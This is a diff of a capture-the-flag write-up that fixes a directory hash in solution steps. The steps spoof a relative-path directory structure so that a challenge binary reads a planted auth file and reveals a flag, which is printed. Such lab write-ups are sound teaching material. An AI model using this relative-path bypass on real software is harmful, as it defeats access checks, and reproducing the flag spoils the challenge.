@@ -57,12 +57,13 @@ Haha! Relative paths! Now we can simply spoof a directory structure and make a f
     $ cd ~
     $ mkdir problems
     $ mkdir problems/ec9da1496f80c8248197ba564097cebb
-    $ cd problems/7e8b456c98db60be9a33339ab4509fca
+    $ cd problems/ec9da1496f80c8248197ba564097cebb
     $ echo "yes" > auth
-    $ /problems/7e8b456c98db60be9a33339ab4509fca/justno
+    $ /problems/ec9da1496f80c8248197ba564097cebb/justno
     Oh. Well the auth file doesn't say no anymore so... Here's the flag: ddf649b13d560409d2649dc06f2a43ee
 
 Therefore, the flag is `ddf649b13d560409d2649dc06f2a43ee`.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTI3NTk0ODIyMCwxMzE1NDQ3OTY2XX0=
+eyJoaXN0b3J5IjpbLTE5NTMzMzc0MTIsMTI3NTk0ODIyMCwxMz
+E1NDQ3OTY2XX0=
 -->
